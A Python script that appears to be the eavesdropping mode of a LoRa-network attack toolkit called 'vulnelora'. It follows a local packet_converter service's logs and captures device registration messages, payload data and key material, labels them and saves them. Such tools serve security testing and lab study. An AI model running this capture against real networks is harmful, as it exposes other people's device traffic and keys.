#!/usr/bin/env python3

import os
import sys
import json
import subprocess


save_flag = 0
service_path = "/opt/vulnelora"


attack_config = {'save_capture': False,
'capture_path': "./vulnelora_capture.log",
'save_analysis': False,
'analysis_path': "./vulnelora_analysis.log"
}


def check_save():
    if save_flag == 0:
        print("\n>> Current attack configuration not saved, would you like to save it? [y/n] ", end='')
        save_req = input()

        if save_req.strip().lower() == "y":
            print("\n>> Enter path (including file name) where the attack configuration should be saved: ", end='')
            path = input()
            save_conf(path)
        elif save_req.strip().lower() == "n":
            pass
        else:
            print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")


def extract(text, value):
    return text[len(value)+1:].strip()


def validate_path(value):
    if os.path.exists(value):
        return os.path.getsize(value) > 0
    else:
        return 0


def print_args():
    formatted_args = json.dumps(attack_config, indent=4)
    print(formatted_args)


def save_conf(path):
    with open(path, 'w') as file_w:
        json.dump(attack_config, file_w)
    with open(path, 'r') as file_r:
        file_content = json.load(file_r)
        if file_content == attack_config:
            global save_flag
            save_flag = 1
            print(f"\n>> [SUCCESS]: Current attack configuration saved successfully in '{path}'!")
        else:
            print("\n>> [ERROR]: Attack configuration has not beed saved correctly due to unknown error. Please, try again.")


def transfer_conf(loaded_conf):
        global attack_config
        attack_config.update(loaded_conf)


def collect_logs():
    print("\n [INFO]: Started collecting logs (stop with Ctrl+c)...\n")
    output_file = f"{service_path}/resources/eavesdropping_tmp_capture.log"

    try:
        if not os.path.exists(output_file):
            with open(output_file, 'w') as file:
                file.write("")
    except Exception as e:
        print(e)

    try:
        command = ['journalctl', '-u', 'packet_converter', '-f']

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        with open(output_file, 'wb') as f:
            for line in iter(process.stdout.readline, b''):
                if '{"message_body":'.encode() in line:
                    f.write(line)

    except KeyboardInterrupt:
        print("\n\n [INFO]: Log collection stopped, starting analysis...\n")
        return
    except Exception as e:
        print(f"[ERROR]: Unexpected error occurred: {str(e)}")


def analyze_logs():
    json_logs = []
    log_file = f"{service_path}/resources/eavesdropping_tmp_capture.log"
    record_counter = 1

    try:
        if not os.path.exists(log_file):
            print("\n[ERROR]: Log file not found, capture some logs first")
            return
    except Exception as e:
        print(e)

    with open(log_file, 'r') as logfile:
        content = logfile.readlines()

        if len(content) == 0:
            print("\n[ERROR]: No data captured, try again")
            return

        if attack_config['save_capture']:
            c_logfile = attack_config['capture_path']

            with open(c_logfile, 'w') as clear_file:
                clear_file.write("")

            with open(c_logfile, 'a') as file:
                for line in content:
                    file.write(line)

            print(f"\n[SUCCESS]: Captured data saved successfully in '{c_logfile}'!")

    for entry in content:
        json_str = entry.split(': ')[-1]
        log_data = json.loads(json_str)
        json_logs.append(log_data)


    for log in json_logs:
        print()
        print(20 * '#', end=' ')
        print(f"Message No. {record_counter}", end=' ')
        print(20 * '#')

        if "REGR" in log['message_name']:
            print(f"\n>> [INFO]: Caught REGISTRATION REQUEST data for device {log['message_body']['dev_id']}\n")
        elif "REGA" in log['message_name']:
            print(f"\n>> [INFO]: Caught REGISTRATION ACK data for device {log['message_body']['dev_id']}\n")
        elif "SETR" in log['message_name']:
            print(f"\n>> [INFO]: Caught AP REGISTRATION REQUEST data for AP {log['message_body']['id']}\n")
        elif "SETA" in log['message_name']:
            print(f"\n>> [INFO]: Caught AP REGISTRATION ACK data for AP {log['message_body']['id']}\n")
        elif "TXL" in log['message_name']:
            print(f"\n>> [INFO]: Caught RECEIVED data to device {log['message_body']['dev_id']}\n")
        elif "RXL" in log['message_name']:
            print(f"\n>> [INFO]: Caught TRANSMITTED data from device {log['message_body']['dev_id']}\n")
        elif "KEYS" in log['message_name']:
            print(f"\n>> [INFO]: Caught KEYS data for device {log['message_body']['dev_id']}\n")
        else:
            print(f"\n>> [INFO]: Caught MISC data for device {log['message_body']['dev_id']}\n")

        print(json.dumps(log, indent=4))
        record_counter = record_counter + 1

    print()

    if attack_config['save_analysis']:
        a_logfile = attack_config['analysis_path']

        with open(a_logfile, 'w') as clear_file:
            clear_file.write("")

        with open(a_logfile, 'a') as file:
            for log in json_logs:
                json.dump(log, file, indent=4)
                file.write('\n')
                file.write(40 * "#")
                file.write('\n')

        print(f"\n[SUCCESS]: Analyzed data saved successfully in '{a_logfile}'!")

    # os.remove(log_file)


def detect_service():
    try:
        result = subprocess.run(['systemctl', 'status', 'packet_converter.service'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if result.returncode == 0 or result.returncode == 3:
            return True
        else:
            return False
    except Exception as e:
        print(e)


def argument_parser():
    argument = sys.argv[1]
    base_name, extension = os.path.splitext(argument)

    while True:
        print(f"\033[96m\nvulnelora\033[0m[\033[91m{base_name}\033[96m]>\033[0m ", end='')
        arg_input = input()

        if arg_input == "help":
            with open(service_path + '/modes/help_messages/eavesdropping.txt', 'r') as file:
                file_content = file.read()
                print(file_content)
        elif "save_capture" in arg_input:
            if arg_input == "save_capture true":
                attack_config['save_capture'] = True
                print(f"\n>> Enabled argument: save_capture")
            else:
                attack_config['save_capture'] = False
                print(f"\n>> Disabled argument: save_capture")
        elif "save_analysis" in arg_input:
            if arg_input == "save_analysis true":
                attack_config['save_analysis'] = True
                print(f"\n>> Enabled argument: save_analysis")
            else:
                attack_config['save_analysis'] = False
                print(f"\n>> Disabled argument: save_analysis")
        elif "capture_path" in arg_input:
            if attack_config['save_capture'] == False:
                print("\n>> [ERROR]: Enable save_capture configuration first using command 'save_capture true'!")
                continue
            tmp_c_path = extract(arg_input, 'capture_path')
            if validate_path(tmp_c_path):
                print("\n>> Path to save current data capture already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    attack_config['capture_path'] = tmp_c_path
                    print(f"\n>> Set argument: capture_path={tmp_c_path}")
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_c_path != "":
                    attack_config['capture_path'] = tmp_c_path
                    print(f"\n>> Set argument: capture_path={tmp_c_path}")
                else:
                    attack_config['capture_path'] = "./vulnelora_capture.log"
                    print("\n>> Set argument: capture_path='./vulnelora_capture.log' (default value, path is not valid)")
        elif "analysis_path" in arg_input:
            if attack_config['save_analysis'] == False:
                print("\n>> [ERROR]: Enable save_analysis configuration first using command 'save_analysis true'!")
                continue
            tmp_a_path = extract(arg_input, 'analysis_path')
            if validate_path(tmp_a_path):
                print("\n>> Path to save current data analysis already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    attack_config['analysis_path'] = tmp_a_path
                    print(f"\n>> Set argument: analysis_path={tmp_a_path}")
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_c_path != "":
                    attack_config['analysis_path'] = tmp_a_path
                    print(f"\n>> Set argument: analysis_path={tmp_a_path}")
                else:
                    attack_config['analysis_path'] = "./vulnelora_analysis.log"
                    print("\n>> Set argument: analysis_path='./vulnelora_analysis.log' (default value, path is not valid)")
        elif arg_input == "print":
            print("\n>> Current argument configuration:")
            print_args()
        elif "save" in arg_input:
            tmp_path = extract(arg_input, 'save')
            if validate_path(tmp_path):
                print("\n>> Path to save current attack configuration already exists. Overwrite? [y/n] ", end='')
                overwrite = input()
                if overwrite.strip().lower() == "y":
                    save_conf(tmp_path)
                elif overwrite.strip().lower() == "n":
                    pass
                else:
                    print("\n>> Valid answers are 'y' or 'n'. Any other answers are interpreted same as 'n'.")
            else:
                if tmp_path != "":
                    save_conf(tmp_path)
                else:
                    print("\n>> [ERROR]: Attack configuration not saved. Please, input a valid path (including file name).")
        elif "load" in arg_input:
            tmp_path = extract(arg_input, 'load')
            if validate_path(tmp_path) and tmp_path != "":
                with open(tmp_path, 'r') as file:
                    file_content = json.load(file)
                    transfer_conf(file_content)
                    if attack_config == file_content:
                        print("\n>> [SUCCESS]: Attack configuration has been loaded successfully! Current configuration is:")
                        print_args()
                    else:
                        print("\n>> [ERROR]: Attack configuration has not been loaded due to unknown error. Please, try again.")
            else:
                print("\n>> [ERROR]: File does not exist.")
        elif arg_input == "finish":
            print("\n>> Final attack configuration:")
            print_args()
            print()
            check_save()
            break
        elif arg_input == "exit":
            check_save()
            exit(0)
        else:
            print(f"\n[ERROR]: Unknown argument '{arg_input}'. Type 'help' to see the supported arguments.")


if __name__ == "__main__":
    try:
        if not detect_service():
            print("\n[ERROR]: Missing packet_converter service, cannot run this attack\n")
            exit(1)

        argument_parser()
        collect_logs()
        analyze_logs()
    except KeyboardInterrupt:
        exit(0)

    exit(0)
